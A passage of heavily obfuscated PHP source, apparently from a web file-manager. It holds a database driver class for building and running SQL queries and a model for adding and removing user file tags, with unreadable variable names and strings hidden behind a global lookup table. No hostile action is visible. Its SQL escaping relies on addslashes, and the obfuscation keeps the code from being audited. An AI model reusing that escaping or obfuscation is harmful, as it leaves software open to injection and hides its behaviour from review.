$­ğ‘©ª[12]); return $this->execute($²îŞÍÂí, $this->parseBind(!empty($øş¯çäĞ[$­ğ‘©ª[361]]) ? $øş¯çäĞ[$­ğ‘©ª[361]] : array())); } public function delete($Ô×ÏŸŞÍ = array()) { $°Õ¸œ˜™ =& $_SERVER[ìïæ“œî]; $this->model = $Ô×ÏŸŞÍ[$°Õ¸œ˜™[358]]; $İëìâı = $°Õ¸œ˜™[1097] . $this->parseTable($Ô×ÏŸŞÍ[$°Õ¸œ˜™[356]]) . $this->parseWhere(!empty($Ô×ÏŸŞÍ[$°Õ¸œ˜™[352]]) ? $Ô×ÏŸŞÍ[$°Õ¸œ˜™[352]] : $°Õ¸œ˜™[12]) . $this->parseOrder(!empty($Ô×ÏŸŞÍ[$°Õ¸œ˜™[441]]) ? $Ô×ÏŸŞÍ[$°Õ¸œ˜™[441]] : $°Õ¸œ˜™[12]) . $this->parseLimit(!empty($Ô×ÏŸŞÍ[$°Õ¸œ˜™[368]]) ? $Ô×ÏŸŞÍ[$°Õ¸œ˜™[368]] : $°Õ¸œ˜™[12]) . $this->parseLock(isset($Ô×ÏŸŞÍ[$°Õ¸œ˜™[892]]) ? $Ô×ÏŸŞÍ[$°Õ¸œ˜™[892]] : !1) . $this->parseComment(!empty($Ô×ÏŸŞÍ[$°Õ¸œ˜™[430]]) ? $Ô×ÏŸŞÍ[$°Õ¸œ˜™[430]] : $°Õ¸œ˜™[12]); return $this->execute($İëìâı, $this->parseBind(!empty($Ô×ÏŸŞÍ[$°Õ¸œ˜™[361]]) ? $Ô×ÏŸŞÍ[$°Õ¸œ˜™[361]] : array())); } public function select($õ±îöÉì = array()) { $†àıÇÃÏ =& $_SERVER[ìïæ“œî]; $this->model = $õ±îöÉì[$†àıÇÃÏ[358]]; $ÊøˆÀ± = $this->buildSelectSql($õ±îöÉì); $º€²ìËï = isset($õ±îöÉì[$†àıÇÃÏ[425]]) ? $õ±îöÉì[$†àıÇÃÏ[425]] : !1; if ($º€²ìËï) { $îˆã®“À = is_string($º€²ìËï[$†àıÇÃÏ[97]]) ? $º€²ìËï[$†àıÇÃÏ[97]] : $†àıÇÃÏ[1098] . md5($ÊøˆÀ±); $£ŞÜÙÆÎ = think_cache($îˆã®“À, $†àıÇÃÏ[12], $º€²ìËï); if (!1 !== $£ŞÜÙÆÎ) { return $£ŞÜÙÆÎ; } } $ÄÂóÇ› = $this->query($ÊøˆÀ±, $this->parseBind(!empty($õ±îöÉì[$†àıÇÃÏ[361]]) ? $õ±îöÉì[$†àıÇÃÏ[361]] : array())); if ($º€²ìËï && !1 !== $ÄÂóÇ›) { think_cache($îˆã®“À, $ÄÂóÇ›, $º€²ìËï); } return $ÄÂóÇ›; } public function buildSelectSql($äÈ¦°œ£ = array()) { $¦˜°«¥“ =& $_SERVER[ìïæ“œî]; if (isset($äÈ¦°œ£[$¦˜°«¥“[429]])) { if (strpos($äÈ¦°œ£[$¦˜°«¥“[429]], $¦˜°«¥“[50])) { list($ŞÉÎªÌ³, $İ¡†Üı) = explode($¦˜°«¥“[50], $äÈ¦°œ£[$¦˜°«¥“[429]]); } else { $ŞÉÎªÌ³ = $äÈ¦°œ£[$¦˜°«¥“[429]]; } $ŞÉÎªÌ³ = $ŞÉÎªÌ³ ? $ŞÉÎªÌ³ : 1; $İ¡†Üı = isset($İ¡†Üı) ? $İ¡†Üı : (is_numeric($äÈ¦°œ£[$¦˜°«¥“[368]]) ? $äÈ¦°œ£[$¦˜°«¥“[368]] : 20); $àÂúó¿İ = $İ¡†Üı * ((int) $ŞÉÎªÌ³ - 1); $äÈ¦°œ£[$¦˜°«¥“[368]] = $àÂúó¿İ . $¦˜°«¥“[50] . $İ¡†Üı; } if (think_config($¦˜°«¥“[1099])) { $İêÇñ‰ï = $¦˜°«¥“[1100] . md5(serialize($äÈ¦°œ£)); $­š‰Ğ… = think_cache($İêÇñ‰ï); if ($­š‰Ğ…) { return $­š‰Ğ…; } } $Ñúâë¨¡ = $this->parseSql($this->selectSql, $äÈ¦°œ£); $Ñúâë¨¡ .= $this->parseLock(isset($äÈ¦°œ£[$¦˜°«¥“[892]]) ? $äÈ¦°œ£[$¦˜°«¥“[892]] : !1); if (isset($İêÇñ‰ï)) { think_cache($İêÇñ‰ï, $Ñúâë¨¡); } return $Ñúâë¨¡; } public function parseSql($Ò™şó†ò, $Ó ØÄˆ° = array()) { $°¡ÃµÆš =& $_SERVER[ìïæ“œî]; $Ò™şó†ò = str_replace(array($°¡ÃµÆš[1101], $°¡ÃµÆš[1102], $°¡ÃµÆš[1103], $°¡ÃµÆš[1104], $°¡ÃµÆš[1105], $°¡ÃµÆš[1106], $°¡ÃµÆš[1107], $°¡ÃµÆš[1108], $°¡ÃµÆš[1109], $°¡ÃµÆš[1110], $°¡ÃµÆš[1111]), array($this->parseTable("{$Ó ØÄˆ°[$°¡ÃµÆš[356]]}"), $this->parseDistinct(isset($Ó ØÄˆ°[$°¡ÃµÆš[1112]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[1112]] : !1), $this->parseField(!empty($Ó ØÄˆ°[$°¡ÃµÆš[350]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[350]] : $°¡ÃµÆš[220]), $this->parseJoin(!empty($Ó ØÄˆ°[$°¡ÃµÆš[359]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[359]] : $°¡ÃµÆš[12]), $this->parseWhere(!empty($Ó ØÄˆ°[$°¡ÃµÆš[352]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[352]] : $°¡ÃµÆš[12]), $this->parseGroup(!empty($Ó ØÄˆ°[$°¡ÃµÆš[578]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[578]] : $°¡ÃµÆš[12]), $this->parseHaving(!empty($Ó ØÄˆ°[$°¡ÃµÆš[1113]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[1113]] : $°¡ÃµÆš[12]), $this->parseOrder(!empty($Ó ØÄˆ°[$°¡ÃµÆš[441]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[441]] : $°¡ÃµÆš[12]), $this->parseLimit(!empty($Ó ØÄˆ°[$°¡ÃµÆš[368]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[368]] : $°¡ÃµÆš[12]), $this->parseUnion(!empty($Ó ØÄˆ°[$°¡ÃµÆš[423]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[423]] : $°¡ÃµÆš[12]), $this->parseComment(!empty($Ó ØÄˆ°[$°¡ÃµÆš[430]]) ? $Ó ØÄˆ°[$°¡ÃµÆš[430]] : $°¡ÃµÆš[12])), $Ò™şó†ò); return $Ò™şó†ò; } public function getLastSql($Ø«”§í‡ = '') { return $Ø«”§í‡ ? $this->modelSql[$Ø«”§í‡] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($£ÒÚ‰Š) { return addslashes($£ÒÚ‰Š); } public function setModel($Ò¦ÆÆ†Ş) { $this->model = $Ò¦ÆÆ†Ş; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto ağßå´ÈéÍ; DÓ…¨è¡”“: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($—òŒÚÆš) { $èúÛáõë =& $_SERVER[ìïæ“œî]; return array($èúÛáõë[2061] => array($èúÛáõë[2476] . USER_ID, $èúÛáõë[2062])); } protected function listData() { $¶ï‚ä² =& $_SERVER[ìïæ“œî]; $ŠÁ’¿Öò = array($¶ï‚ä²[1738] => USER_ID, $¶ï‚ä²[557] => array($¶ï‚ä²[2065], 0)); $Ÿõú¾æô = $¶ï‚ä²[2477]; $ÙÕ º˜Ø = $this->field($Ÿõú¾æô)->where($ŠÁ’¿Öò)->order($¶ï‚ä²[2068])->select(); return $ÙÕ º˜Ø ? $ÙÕ º˜Ø : array(); } protected function addToTag($©Ë›¡±, $Í×¸¥‚õ) { $·´³ˆüê =& $_SERVER[ìïæ“œî]; if (!Model($·´³ˆüê[2212])->listData($Í×¸¥‚õ)) { return !1; } if (is_numeric($©Ë›¡±)) { $ÈÉ ùò = Model($·´³ˆüê[873])->pathInfo($©Ë›¡±); if (!$ÈÉ ùò) { return !1; } } else { $ÈÉ ùò = IO::infoSimple($©Ë›¡±); if (!$ÈÉ ùò) { return !1; } $­¨–ÄıÇ = $ÈÉ ùò[$·´³ˆüê[32]]; $Î³¸Šˆì = $ÈÉ ùò[$·´³ˆüê[33]]; if (isset($ÈÉ ùò[$·´³ˆüê[485]])) { $Î³¸Šˆì = $ÈÉ ùò[$·´³ˆüê[485]] == $·´³ˆüê[91] ? $·´³ˆüê[78] : $·´³ˆüê[230]; } } $ûÚúÈğ“ = array($·´³ˆüê[1738] => USER_ID, $·´³ˆüê[557] => $Í×¸¥‚õ, $·´³ˆüê[495] => $©Ë›¡±, $·´³ˆüê[496] => $Î³¸Šˆì ? $Î³¸Šˆì : $·´³ˆüê[490], $·´³ˆüê[494] => $­¨–ÄıÇ ? $­¨–ÄıÇ : $·´³ˆüê[12], $·´³ˆüê[1950] => 0); if ($this->where($ûÚúÈğ“)->find()) { return !1; } return $this->add($ûÚúÈğ“); } protected function removeFromTag($ú—Ÿ‹Ê, $™‘™Ôõ¡) { $¶Å¿ı =& $_SERVER[ìïæ“œî]; if (!Model($¶Å¿ı[2212])->listData($™‘™Ôõ¡)) { return !1; } if (is_array($ú—Ÿ‹Ê)) { $ú—Ÿ‹Ê = array($¶Å¿ı[7], $ú—Ÿ‹Ê); } $¦ı¾×µ = array($¶Å¿ı[1738] => USER_ID, $¶Å¿ı[557] => $™‘™Ôõ¡, $¶Å¿ı[495] => $ú—Ÿ‹Ê); return $this->where($¦ı¾×µ)->delete(); } protected function removeByTag($©ôÈæ¤¸) { $§Ù¯ı¸Á =& $_SERVER[ìïæ“œî]; if (!$©ôÈæ¤¸) { return !1; } $Ğ°ÑÀïÌ = array($§Ù¯ı¸Á[1738] => USER_ID, $§Ù¯ı¸Á[557] => $©ôÈæ¤¸); return $this->where($Ğ°ÑÀïÌ)->delete(); } protected function removeBySource($áóÄı¿) { $ğƒ¥»½ƒ =& $_SERVER[ìïæ“œî]; if (is_array($áóÄı¿)) { $áóÄı¿ = array($ğƒ¥»½ƒ[7], $áóÄı¿); } $Üµæ‘¥ = array($ğƒ¥»½ƒ[1738] => USER_ID, $ğƒ¥»½ƒ[557] => array($ğƒ¥»½ƒ[1069], 0), $ğƒ¥»½ƒ[495] => $áóÄı¿); return $this->where($Üµæ‘¥)->delete(); } }